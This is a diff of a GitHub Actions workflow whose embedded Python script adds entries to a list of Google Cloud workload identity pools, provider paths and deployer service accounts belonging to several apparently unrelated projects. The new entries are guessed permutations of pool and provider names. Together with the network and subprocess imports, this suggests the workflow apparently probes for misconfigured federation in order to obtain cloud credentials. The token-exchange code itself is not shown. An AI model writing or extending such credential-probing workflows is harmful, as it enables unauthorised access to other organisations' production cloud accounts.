@@ -17,10 +17,29 @@ jobs:
           python3 - <<'PY'
           import json, base64, os, subprocess, urllib.parse, urllib.request, urllib.error, time
           PROVIDERS=[
-            ('vvakame-playground','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/gha-provider',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com']),
-            ('cubecommons-prod','366271888053','projects/366271888053/locations/global/workloadIdentityPools/cube-prod/providers/github-actions',['service-deployer@cubecommons-prod.iam.gserviceaccount.com']),
-            ('cubecommons-dev','744911585239','projects/744911585239/locations/global/workloadIdentityPools/cube-dev/providers/github-actions',['docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com']),
-            ('methodical-mark','1076618220242','projects/1076618220242/locations/global/workloadIdentityPools/forgecrux-pool/providers/github-provider',['gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com'])
+
+          ('vvakame-playground','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/gha-provider',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com']),
+
+          ('cubecommons-prod','366271888053','projects/366271888053/locations/global/workloadIdentityPools/cube-prod/providers/github-actions',['service-deployer@cubecommons-prod.iam.gserviceaccount.com']),
+
+          ('cubecommons-dev','744911585239','projects/744911585239/locations/global/workloadIdentityPools/cube-dev/providers/github-actions',['docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com']),
+
+          ('methodical-mark','1076618220242','projects/1076618220242/locations/global/workloadIdentityPools/forgecrux-pool/providers/github-provider',['gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com']),
+
+          ('vv-github-actions-github-actions','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github-actions',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com','381521917100-compute@developer.gserviceaccount.com']),
+
+          ('vv-github-actions-github','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com','381521917100-compute@developer.gserviceaccount.com']),
+
+          ('vv-github-actions-github-oidc','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github-oidc',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com','381521917100-compute@developer.gserviceaccount.com']),
+
+          ('vv-github-pool-github-provider','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github-pool/providers/github-provider',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com','381521917100-compute@developer.gserviceaccount.com']),
+
+          ('vv-github-pool-github-actions','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github-pool/providers/github-actions',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com','381521917100-compute@developer.gserviceaccount.com']),
+
+          ('vv-github-github-actions','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github/providers/github-actions',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com','381521917100-compute@developer.gserviceaccount.com']),
+
+          ('vv-github-oidc-github-actions','381521917100','projects/381521917100/locations/global/workloadIdentityPools/github-oidc/providers/github-actions',['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com','381521917100-compute@developer.gserviceaccount.com']),
+
           ]
           def jl(b):
               try: return json.loads(b)
